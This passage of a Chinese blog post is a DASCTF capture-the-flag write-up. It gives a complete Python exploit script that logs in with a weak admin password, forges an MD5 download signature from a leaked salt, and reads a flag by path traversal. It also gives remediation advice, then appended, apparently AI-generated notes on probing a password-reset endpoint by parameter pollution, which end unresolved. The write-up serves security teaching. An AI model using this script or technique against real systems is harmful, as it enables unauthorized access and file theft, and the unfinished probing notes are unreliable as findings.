+<h2 id="完整EXP脚本"><a href="#完整EXP脚本" class="headerlink" title="完整EXP脚本"></a>完整EXP脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_v1_5
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">def</span> <span class="token function">calculate_sign</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""计算文件下载的sign值"""</span>
+    salt <span class="token operator">=</span> <span class="token string">"f9bc855c9df15ba7602945fb939deefc"</span>
+    firstMi <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    jieStr <span class="token operator">=</span> firstMi<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
+    newStr <span class="token operator">=</span> firstMi <span class="token operator">+</span> jieStr <span class="token operator">+</span> salt
+    sign <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>newStr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> sign
+<span class="token comment"># 目标URL</span>
+base_url <span class="token operator">=</span> <span class="token string">"http://TARGET:81"</span>
+<span class="token comment"># 1. 准备RSA登录</span>
+public_key_b64 <span class="token operator">=</span> <span class="token string">"MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPiZ8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk619aaw0Md9MNvn3w0JAgMBAAE="</span>
+public_key_der <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>public_key_b64<span class="token punctuation">)</span>
+rsa_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>public_key_der<span class="token punctuation">)</span>
+cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsa_key<span class="token punctuation">)</span>
+username <span class="token operator">=</span> <span class="token string">"admin"</span>
+password <span class="token operator">=</span> <span class="token string">"123456"</span>
+<span class="token comment"># 2. 加密密码</span>
+encrypted_pwd <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+encrypted_pwd_b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted_pwd<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"username=</span><span class="token interpolation"><span class="token punctuation">{</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&amp;password=</span><span class="token interpolation"><span class="token punctuation">{</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>encrypted_pwd_b64<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+<span class="token comment"># 3. 登录</span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/login"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span>
+                 headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                 allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 登录成功!"</span><span class="token punctuation">)</span>
+    <span class="token comment"># 4. 下载flag</span>
+    filename <span class="token operator">=</span> <span class="token string">"../../flag"</span>
+    sign <span class="token operator">=</span> calculate_sign<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
+    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>base_url<span class="token punctuation">}</span></span><span class="token string">/download?file=</span><span class="token interpolation"><span class="token punctuation">{</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&amp;sign=</span><span class="token interpolation"><span class="token punctuation">{</span>sign<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Flag: </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 登录失败"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><pre class="line-numbers language-warp-runnable-command" data-language="warp-runnable-command"><code class="language-warp-runnable-command">DASCTF{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><h3 id="1-信息泄露（Critical）"><a href="#1-信息泄露（Critical）" class="headerlink" title="1. 信息泄露（Critical）"></a>1. 信息泄露（Critical）</h3><ul>
+<li><p><strong>漏洞位置</strong>: 前端JavaScript代码</p>
+</li>
+<li><p><strong>漏洞描述</strong>: RSA公钥被注释在前端代码中，攻击者可以直接获取</p>
+</li>
+<li><p>修复建议</p>
+<p>:</p>
+<ul>
+<li>完全删除注释的敏感信息</li>
+<li>使用代码混淆和压缩</li>
+<li>定期审查前端代码</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-弱密码（High）"><a href="#2-弱密码（High）" class="headerlink" title="2. 弱密码（High）"></a>2. 弱密码（High）</h3><ul>
+<li><p><strong>漏洞描述</strong>: 管理员账号使用弱密码 <code>123456</code></p>
+</li>
+<li><p>修复建议</p>
+<p>:</p>
+<ul>
+<li>强制使用强密码策略</li>
+<li>实施账号锁定机制</li>
+<li>启用双因素认证</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-路径遍历（High）"><a href="#3-路径遍历（High）" class="headerlink" title="3. 路径遍历（High）"></a>3. 路径遍历（High）</h3><ul>
+<li><p><strong>漏洞位置</strong>: <code>/download</code> 接口</p>
+</li>
+<li><p><strong>漏洞描述</strong>: 虽然有sign验证，但允许 <code>../../</code> 路径遍历</p>
+</li>
+<li><p>修复建议</p>
+<p>:</p>
+<ul>
+<li>严格验证文件路径</li>
+<li>使用白名单限制可下载文件</li>
+<li>规范化路径，拒绝包含 <code>../</code> 的请求</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-签名算法安全性不足（Medium）"><a href="#4-签名算法安全性不足（Medium）" class="headerlink" title="4. 签名算法安全性不足（Medium）"></a>4. 签名算法安全性不足（Medium）</h3><ul>
+<li><p><strong>漏洞描述</strong>: sign算法依赖固定salt，一旦salt泄露（如通过app.jmx），签名机制失效</p>
+</li>
+<li><p>修复建议</p>
+<p>:</p>
+<ul>
+<li>使用HMAC等更安全的签名算法</li>
+<li>引入时间戳防重放</li>
+<li>定期更换密钥</li>
+</ul>
+</li>
+</ul>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
+<li><strong>前端安全</strong>: 敏感信息不应存在于前端代码中</li>
+<li><strong>RSA加密</strong>: 公钥加密的正确使用方式</li>
+<li><strong>文件下载</strong>: 路径遍历漏洞的利用</li>
+<li><strong>签名机制</strong>: MD5签名的设计与破解</li>
+<li><strong>信息收集</strong>: 从配置文件中提取关键信息</li>
+</ol>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP Path Traversal</a></li>
+<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA加密算法</a></li>
+<li><a target="_blank" rel="noopener" href="https://jmeter.apache.org/">JMeter配置文件格式</a></li>
+</ul>
+<hr>
+<p>● 好的，让我总结一下我的发现：</p>
+<p>  已发现的关键信息</p>
+<ol>
+<li>参数传递机制</li>
+</ol>
+<ul>
+<li>/admin/resetPassword 接口接受 JSON格式的POST请求</li>
+<li>后端方法签名：public String resetPassword(String) - 只接受一个String参数（整个JSON字符串）</li>
+<li>JSON参数 和 URL查询参数 可以同时使用</li>
+</ul>
+<ol start="2">
+<li>参数污染特性</li>
+</ol>
+<ul>
+<li>✅ URL参数可以补充JSON中缺失的字段（如newPassword）<ul>
+<li>例：?newPassword=xxx + {“username”:”admin”,”oldPassword”:”123456”} → 成功</li>
+</ul>
+</li>
+<li>❌ URL参数不能覆盖JSON中已有的字段<ul>
+<li>例：?username=sun + {“username”:”admin”,…} → admin的密码被修改，不是sun</li>
+</ul>
+</li>
+<li>❌ username字段必须在JSON中提供，不能只通过URL参数<ul>
+<li>只用URL参数会报500错误</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>不同Content-Type的行为</li>
+</ol>
+<ul>
+<li>application/json + JSON数据 → ✅ 正常工作</li>
+<li>application/x-www-form-urlencoded + form数据 → ❌ 报”syntax error”（后端尝试解析为JSON失败）</li>
+<li>multipart/form-data → ❌ 报”Required request body is missing”</li>
+</ul>
+<ol start="4">
+<li>测试过的用户名</li>
+</ol>
+<p>  使用 ?username=xxx 时，以下用户名都返回”密码重置成功”：</p>
+<ul>
+<li>sun, sunset, set, flag, root, guest, getflag, admin</li>
+<li>但无法用这些修改对应用户的密码（URL参数的username不生效）</li>
+</ul>
+<ol start="5">
+<li>登录接口</li>
+</ol>
+<ul>
+<li>只接受 application/x-www-form-urlencoded 格式</li>
+<li>不接受JSON格式</li>
+</ul>
+<p>  未找到的内容</p>
+<ul>
+<li>❌ Flag在哪里</li>
+<li>❌ 如何通过”传参方式”获取flag</li>
+<li>❌ “看落日”的真正含义</li>
+<li>❌ 参数污染的正确利用方式</li>
+</ul>
+<p>  核心困惑</p>
+<p>  题目强调**”看看传参方式”**，我已经测试了多种传参方式的组合，但都只得到”密码重置成功”的响应，没有发现flag或特殊信息。可能遗漏了某个关键的参数名、特殊的参数组合方<br>  式，或者flag在我没想到的其他地方。</p>
+<p>  Todos<br>  ☐ 重新理解”看落日的时候，看看传参方式”的真正含义</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lingqing777.github.io/2025/12/07/dasctf/">https://lingqing777.github.io/2025/12/07/dasctf/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/12/13/peng-cheng-bei/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="鹏程杯">
+                        
+                        <span class="card-title">鹏程杯</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-12-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/12/05/qiang-wang-ni-tai/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="强网拟态">
+                        
+                        <span class="card-title">强网拟态</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-12-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/ai-waf/">
+                        <span class="chip bg-color">ai_waf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025-2026</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">158.5k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
